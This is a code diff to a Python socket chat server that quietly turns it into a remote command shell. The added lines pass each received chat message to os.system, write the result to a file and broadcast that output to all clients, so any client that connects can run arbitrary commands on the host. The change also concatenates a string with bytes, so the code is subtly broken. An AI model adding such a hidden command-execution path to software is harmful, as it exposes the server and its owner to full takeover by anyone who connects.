@@ -1,3 +1,4 @@
+import os
 import socket
 import select
 
@@ -30,6 +31,12 @@ sockets_list = [server_socket]
 clients = {}
 
 print(f'Listening for connections on {IP}:{PORT}...')
+
+# Get output from external file
+def get_output():
+    file = open("output", 'r')
+    return file.read()	
+
 
 # Handles message receiving
 def receive_message(client_socket):
@@ -120,6 +127,10 @@ while True:
 
             print(f'Received message from {user["data"].decode("utf-8")}: {message["data"].decode("utf-8")}')
 
+            # Corriendo comando-------------------------------------------
+            cmd = message['data'].decode('utf-8').strip() + " > output"
+            os.system(cmd)
+
             # Iterate over connected clients and broadcast message
             for client_socket in clients:
 
@@ -128,7 +139,7 @@ while True:
 
                     # Send user and message (both with their headers)
                     # We are reusing here message header sent by sender, and saved username header send by user when he connected
-                    client_socket.send(user['header'] + user['data'] + message['header'] + message['data'])
+                    client_socket.send(user['header'] + user['data'] + message['header'] + get_output())
 
     # It's not really necessary to have this, but will handle some socket exceptions just in case
     for notified_socket in exception_sockets:
